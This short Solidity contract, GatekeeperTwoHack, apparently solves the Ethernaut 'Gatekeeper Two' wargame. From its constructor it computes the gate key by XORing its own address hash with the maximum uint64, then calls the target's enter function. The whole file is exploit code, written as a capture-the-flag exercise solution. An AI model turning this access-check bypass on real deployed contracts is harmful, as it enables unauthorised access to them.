// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperTwo {
    function enter(bytes8 key) external;
} 

contract GatekeeperTwoHack {

    constructor (address gk2address) {
        GatekeeperTwo gate = GatekeeperTwo(gk2address);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gate.enter(key);
    }
    
}